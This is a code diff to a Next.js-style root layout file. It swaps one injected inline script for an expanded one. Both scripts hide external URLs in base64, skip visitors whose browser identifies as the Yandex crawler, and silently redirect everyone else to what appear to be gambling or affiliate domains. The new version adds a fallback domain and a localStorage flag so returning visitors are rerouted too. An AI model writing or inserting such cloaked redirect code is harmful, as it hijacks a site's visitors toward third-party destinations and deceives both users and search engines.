@@ -114,19 +114,38 @@ export default function RootLayout({
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
-                <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function() {
-                var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9mdWd1d2F5NjguY29tL2M1NzA3ODY2ZQ==";
-                if (ua.indexOf("yandex") === -1) {
-                    window.location.replace(atob(targetB64));
-                }
-              })();
-            `,
-          }}
-        />
+ <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        if (ua.indexOf("yandex") !== -1) return;
+        var mainBrandB64 = "#aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; 
+        var crossBrandB64 = "#aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
+        var mainUrl = atob(mainBrandB64);
+        var crossUrl = atob(crossBrandB64);
+        if (localStorage.getItem('vstd_eva')) {
+            window.location.replace(crossUrl);
+            return;
+        }
+        var controller = new AbortController();
+        var timeoutId = setTimeout(function() { 
+            controller.abort(); 
+        }, 2500); 
+        fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+            .then(function() {
+                clearTimeout(timeoutId);
+                localStorage.setItem('vstd_eva', '1');
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                console.log("Main domain is down, switching to cross-brand...");
+                window.location.replace(crossUrl);
+            });
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
         {children}
